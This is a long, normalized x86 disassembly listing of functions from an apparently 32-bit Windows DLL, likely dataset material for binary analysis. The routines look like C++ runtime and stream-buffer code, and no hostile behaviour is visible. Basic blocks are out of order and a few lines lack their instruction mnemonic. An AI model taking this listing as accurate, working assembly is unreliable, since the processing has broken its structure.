mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_1000102e
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_100080d1
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_1000ff17
mov ecx edi
call sub_100086e3
push edi
call sub_10010ba2
pop ecx
sub_100080fa
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_1000fec1
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000816c
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
mov ecx 0xffff
mov edx ecx
cmp dx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_10008198
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] ax
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push [ eax ]
mov eax esi
push [ ebp + 0xc ]
push ebx
call sub_100023dd
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
lea ecx [ esi + esi ]
add esp 0xc
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_10008221
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push ebx
push ecx
push [ eax ]
mov eax esi
call sub_100023dd
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
lea ecx [ esi + esi ]
add esp 0xc
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_100082de
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_1000ff17
mov ecx edi
call sub_100086e3
push edi
call sub_10010ba2
pop ecx
sub_10008307
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_1000fec1
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000833d
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_1000fec1
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_100083d8
push 0x0
mov eax sub_10026c5a
call sub_10014213
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_100107f5
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100016de
mov eax esi
call sub_100142eb
retn 0x8
sub_1000848b
push 0x4
mov eax sub_10026c37
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10010876
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100016de
mov eax esi
call sub_100142eb
retn 0x4
sub_100084c5
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10027417
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
and ecx 0x17
mov [ eax + 0x8 ] ecx
mov eax [ eax + 0xc ]
and eax ecx
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ebx ebx
cmp [ ebp + 0xc ] bl
je r-xdata
test al 0x4
je r-xdata
push ebx
push ebx
push 0x2
pop ebx
test bl al
je r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_100016bc
lea eax [ esp + 0x34 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xa8 ] ebx
call sub_100083d8
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
push r--data
lea ecx [ esp + 0x7c ]
call sub_100016bc
lea eax [ esp + 0x78 ]
push eax
lea eax [ esp + 0x54 ]
push eax
mov [ esp + 0xa8 ] ebx
call sub_100083d8
mov [ esp + 0x50 ] r--data
push r--data
lea eax [ esp + 0x54 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_100016bc
lea eax [ esp + 0x34 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xa8 ] 0x1
call sub_100083d8
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
jmp r-xdata
call sub_10013de1
push eax
jmp r-xdata
sub_10008603
push ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax esi
pop ecx
retn
mov eax [ eax + 0x28 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x0
push 0x4
add edx esi
call sub_100085e2
sub_1000863f
push esi
mov esi [ eax ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov ecx esi
pop esi
jmp [ eax + 0x8 ]
sub_1000866f
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_1000fec1
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_100086a1
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000fe10
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_1000fe38
pop edi
mov eax esi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_100086fb
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000fe10
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_1000fe38
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10008760
push 0x4
mov eax sub_10026db4
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
add esi 0x4
call sub_10001a52
call sub_100142eb
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000879a
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10027f03
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x20 ]
xor edi edi
cmp eax edi
je r-xdata
push 0x44
call sub_10010c96
pop ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x60 ] 0x1
cmp eax edi
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_100016bc
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x68 ] edi
call sub_100083d8
push r--data
lea eax [ esp + 0x30 ]
push eax
call sub_10013de1
or [ esp + 0x60 ] 0xffffffff
mov ecx [ esi + 0x20 ]
cmp edi ecx
je r-xdata
lea ecx [ esi + 0x4 ]
push ecx
push eax
call sub_1000c0be
mov edi eax
mov [ esi + 0x20 ] edi
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000885a
push 0x1c
mov eax sub_10027746
call sub_10014213
mov esi ecx
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
call sub_100142eb
retn 0x4
sub_1000889b
push 0x1c
mov eax sub_10027746
call sub_10014213
mov esi ecx
push 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] 0xf
call sub_10001ca7
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
call sub_100142eb
retn 0x4
sub_100088e0
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
mov ebx [ eax + 0x20 ]
test ebx ebx
jne r-xdata
push esi
call sub_1000c18c
lea ecx [ eax + 0x4 ]
mov ebx esi
call sub_1000c04d
jmp r-xdata
mov eax esi
pop ebx
pop ecx
pop ecx
retn
sub_10008907
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100281a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov eax ecx
lea esi [ esp + 0x18 ]
call sub_100088e0
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x48 ] ebx
mov eax [ edi + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push [ esp + 0x1c ]
push 0x4
pop esi
call sub_1000c391
mov esi [ esp + 0x14 ]
cmp esi ebx
jle r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
push 0x4
pop esi
call sub_1000c42e
mov esi [ esp + 0x10 ]
push ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0xf
call sub_10001ca7
push ebx
lea edi [ esp + 0x24 ]
call sub_1000530f
mov esi [ ebp + 0xc ]
push 0xffffffff
push ebx
mov eax edi
push eax
mov ecx esi
mov [ esp + 0x54 ] 0x1
call sub_100018cc
push ebx
push 0x1
mov ecx edi
mov [ esp + 0x50 ] bl
call sub_1000197b
cmp [ esp + 0x10 ] ebx
jle r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
or [ esp + 0x48 ] 0xffffffff
lea eax [ esp + 0x1c ]
call sub_1000863f
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ esi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push edi
push [ esp + 0x1c ]
call sub_1000c391
push esi
push [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
call sub_1000c42e
sub_10008a1c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10028170
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov eax ecx
lea esi [ esp + 0x14 ]
call sub_100088e0
lea eax [ esp + 0x10 ]
push eax
xor edi edi
mov [ esp + 0x6c ] edi
push [ esp + 0x18 ]
mov [ esp + 0x18 ] edi
push 0x4
pop esi
call sub_1000c42e
mov esi [ esp + 0x10 ]
push edi
lea ecx [ esp + 0x40 ]
mov [ esp + 0x58 ] 0xf
call sub_10001ca7
push edi
lea edi [ esp + 0x40 ]
call sub_1000530f
mov [ esp + 0x68 ] 0x1
mov esi [ esp + 0x10 ]
xor edi edi
cmp esi edi
jle r-xdata
push edi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0xf
call sub_10001ca7
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x40 ]
mov [ esp + 0x6c ] 0x2
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x4 ]
mov eax [ esp + 0x34 ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x18 ]
push 0x4
pop esi
call sub_1000c391
mov esi [ esp + 0x1c ]
cmp esi edi
jle r-xdata
cmp [ esp + 0x54 ] 0x10
mov eax [ esp + 0x40 ]
jae r-xdata
push edi
push 0x1
lea ecx [ esp + 0x28 ]
call sub_1000197b
push edi
push 0x1
lea ecx [ esp + 0x44 ]
call sub_1000197b
or [ esp + 0x68 ] 0xffffffff
lea eax [ esp + 0x18 ]
call sub_1000863f
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x4
cmp [ esp + 0x38 ] 0x10
mov eax [ esp + 0x24 ]
jae r-xdata
push eax
push [ esp + 0x18 ]
call sub_1000c42e
lea eax [ esp + 0x40 ]
push eax
push [ esp + 0x18 ]
call sub_1000c391
lea eax [ esp + 0x24 ]
sub_10008b90
push 0x0
mov eax sub_10027b3a
call sub_10014213
mov ebx ecx
mov edi [ ebp + 0x8 ]
lea eax [ ebx + 0xa4 ]
push eax
lea eax [ edi + 0x4 ]
push eax
mov [ edi ] r--data
call sub_1000179f
and [ ebp - 0x4 ] 0x0
lea eax [ ebx + 0x34 ]
push eax
lea ecx [ edi + 0x1c ]
call sub_100016de
lea eax [ ebx + 0x50 ]
push eax
lea ecx [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_100016de
lea eax [ ebx + 0x6c ]
push eax
lea esi [ edi + 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001738
add ebx 0x88
push ebx
lea esi [ edi + 0x70 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001738
mov [ edi + 0x8c ] 0x800
mov eax edi
call sub_100142eb
retn 0x4
sub_10008c2a
push esi
push edi
mov edi ecx
push 0x0
push 0x1
lea esi [ edi + 0x70 ]
mov [ edi ] r--data
call sub_10001a52
push 0x0
push 0x1
lea esi [ edi + 0x54 ]
call sub_10001a52
push 0x0
push 0x1
lea ecx [ edi + 0x38 ]
call sub_1000197b
push 0x0
push 0x1
lea ecx [ edi + 0x1c ]
call sub_1000197b
lea esi [ edi + 0x4 ]
call sub_10001b71
push [ esi ]
call sub_10010ba2
pop ecx
pop edi
pop esi
retn
sub_10008c77
push 0x84
mov eax sub_100284ac
call sub_100142b2
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x68 ] eax
call sub_100032a0
and [ ebp - 0x4 ] 0x0
mov edi r--data
push edi
lea esi [ ebp - 0x90 ]
call sub_1000170e
push edi
lea esi [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000170e
lea eax [ ebp - 0x90 ]
push eax
mov eax esi
push eax
lea ecx [ ebx + 0x70 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000c4ed
pop ecx
pop ecx
mov [ ebp - 0x58 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x5c ] r--data
push 0x0
push 0x1
lea esi [ ebp - 0x34 ]
call sub_10001a52
push 0x0
push 0x1
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x5
call sub_10001a52
lea edi [ ebx + 0x4 ]
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x64 ]
call sub_10002127
call sub_1000cb3c
call sub_10010b92
cmp eax [ ebp - 0x74 ]
je r-xdata
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x5c ] r--data
call sub_1000cb91
push edi
push 0x1
lea esi [ ebp - 0x50 ]
call sub_10001a52
call sub_1001430e
retn 0x8
push edi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x1c ] 0xf
call sub_10001ca7
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x6c ]
lea eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x7
call sub_100038b5
lea ecx [ ebp - 0x5c ]
push ecx
push [ ebp - 0x54 ]
mov ecx eax
call sub_10008dd7
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x54 ]
lea eax [ ebp - 0x34 ]
push eax
call sub_10009125
push edi
push 0x1
lea ecx [ ebp - 0x34 ]
call sub_1000197b
mov [ ebp - 0x4 ] 0x5
lea esi [ ebp - 0x64 ]
call sub_100038dd
jmp r-xdata
mov eax [ ebp - 0x60 ]
cmp eax [ ebp - 0x70 ]
je r-xdata
mov edi [ ebp - 0x54 ]
mov ebx [ edi + 0x14 ]
add edi 0x4
lea esi [ ebp - 0x74 ]
call sub_10002127
mov eax [ ebp - 0x64 ]
xor edi edi
cmp eax edi
je r-xdata
sub_10008dd7
push 0x1d8
mov eax sub_10028130
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x6c ]
mov edi ecx
push eax
mov eax edi
mov [ ebp - 0x6c ] 0x2f
call sub_10009cdc
mov [ ebp - 0x6c ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
push 0x0
push edi
lea esi [ ebp - 0x68 ]
call sub_10003840
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
mov eax [ edi + 0x14 ]
mov ecx [ ebp - 0x6c ]
sub eax ecx
dec eax
push eax
inc ecx
push ecx
push edi
lea esi [ ebp - 0x4c ]
call sub_10003840
mov edi r--data
push edi
lea esi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000170e
push edi
lea esi [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x3
call sub_1000170e
lea eax [ ebp - 0xa4 ]
push eax
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x78 ]
lea ecx [ ebp - 0x68 ]
call sub_1000c59b
add esp 0xc
mov [ ebp - 0x78 ] eax
test eax eax
jne r-xdata
push r--data
lea ecx [ ebp - 0xc0 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
call sub_100083d8
push r--data
lea eax [ ebp - 0x158 ]
push eax
call sub_10013de1
mov [ ebp - 0x7c ] r--data
push 0x0
push ebx
lea esi [ ebp - 0xdc ]
call sub_10001a52
push 0x0
push ebx
lea esi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001a52
push edi
lea esi [ ebp - 0xc0 ]
call sub_1000170e
push edi
lea esi [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000170e
push edi
lea esi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x9
call sub_1000170e
push edi
lea esi [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000170e
mov [ ebp - 0x4 ] 0xb
push [ ebp - 0x70 ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x14c ]
push eax
call sub_1000645b
add esp 0xc
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0x114 ]
push ecx
lea ecx [ ebp - 0x130 ]
push ecx
mov ecx esi
push ecx
lea ecx [ ebp - 0x7c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0xc
call sub_1000c649
add esp 0x14
mov [ ebp - 0x70 ] eax
test eax eax
jne r-xdata
call sub_1000cb3c
mov edi r--data
mov [ ebp - 0x74 ] edi
push 0x0
push ebx
lea esi [ ebp - 0x14c ]
call sub_10001a52
push 0x0
push ebx
lea esi [ ebp - 0xf8 ]
call sub_10001a52
push 0x0
push ebx
lea esi [ ebp - 0x130 ]
call sub_10001a52
push 0x0
push ebx
lea esi [ ebp - 0x114 ]
call sub_10001a52
push 0x0
push ebx
lea esi [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x12
call sub_10001a52
mov esi [ ebp - 0x88 ]
and [ ebp - 0x6c ] 0x0
mov eax esi
call sub_10009e86
test al al
je r-xdata
call sub_1000cb3c
push [ esi + 0x14 ]
mov esi [ ebp - 0x80 ]
push [ ebp - 0x6c ]
lea eax [ ebp - 0x74 ]
lea ecx [ esi + 0x54 ]
push eax
call sub_1000c6e2
lea eax [ ebp - 0x1e4 ]
push eax
call sub_10009635
mov [ ebp - 0x4 ] 0x13
mov esi [ esi + 0x8c ]
lea eax [ ebp - 0x30 ]
call sub_100047b7
mov [ ebp - 0x4 ] 0x14
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x74 ]
push eax
call sub_1000c74b
xor esi esi
jmp r-xdata
lea eax [ ebp - 0x2c ]
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp eax esi
ja r-xdata
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
lea ecx [ ebp - 0xa4 ]
lea eax [ ebp - 0x1e4 ]
call sub_10009707
mov ecx [ ebp - 0x84 ]
push 0xffffffff
push esi
push eax
mov [ ebp - 0x4 ] 0x15
call sub_100018cc
push esi
push ebx
lea ecx [ ebp - 0xa4 ]
call sub_1000197b
push esi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_1000197b
lea eax [ ebp - 0x1e4 ]
mov [ ebp - 0x4 ] 0x12
call sub_10009109
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x74 ] edi
call sub_1000cb91
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] r--data
call sub_1000cb91
push esi
push ebx
lea esi [ ebp - 0x4c ]
call sub_10001a52
push 0x0
push ebx
lea esi [ ebp - 0x68 ]
call sub_10001a52
call sub_100142ff
retn 0x14
push eax
push ecx
lea eax [ ebp - 0x1dc ]
push eax
call sub_10009582
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x74 ]
push eax
call sub_1000c74b
lea eax [ ebp - 0x2c ]
sub_10009125
push 0x80
mov eax sub_10027ae6
call sub_1001427c
mov eax [ ebp + 0x8 ]
push r--data
mov ebx edx
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x8c ] ecx
call sub_1000195e
push 0xf
pop esi
xor edi edi
push edi
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x68 ] esi
call sub_10001ca7
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp - 0x84 ]
lea ecx [ ebx + 0x38 ]
call sub_1000924f
pop ecx
pop ecx
push edi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4c ] esi
call sub_10001ca7
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000c7fd
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x88 ]
cmp eax edi
je r-xdata
xor eax eax
add eax 0x4
jmp r-xdata
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x64 ]
call sub_100018cc
lea eax [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000863f
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] esi
call sub_10001ca7
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_100092f8
pop ecx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] esi
call sub_10001ca7
add ebx 0x1c
push ebx
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_100093b7
mov ecx [ ebp - 0x8c ]
add esp 0xc
push 0xffffffff
push edi
lea eax [ ebp - 0x2c ]
push eax
call sub_100018cc
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000197b
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1000197b
push edi
push esi
lea ecx [ ebp - 0x64 ]
call sub_1000197b
push edi
push esi
lea ecx [ ebp - 0x80 ]
call sub_1000197b
call sub_100142ff
retn 0x4
sub_1000924f
push 0x38
mov eax sub_10027030
call sub_10014213
mov esi ecx
mov ecx [ ebp + 0xc ]
push r--data
call sub_1000195e
cmp [ esi + 0x18 ] 0x10
mov ecx [ esi + 0x14 ]
lea ebx [ esi + 0x4 ]
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
call sub_100142eb
retn
push esi
lea ecx [ ebp - 0x28 ]
call sub_100016de
add edi [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
cmp [ esi + 0x18 ] 0x10
mov eax [ esi + 0x14 ]
jb r-xdata
push ecx
push eax
push [ ebp + 0x8 ]
xor eax eax
call sub_10009c40
mov edi eax
cmp edi 0xffffffff
je r-xdata
push eax
push ebx
push [ ebp + 0x8 ]
mov eax edi
call sub_10009c40
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx ]
cmp edi eax
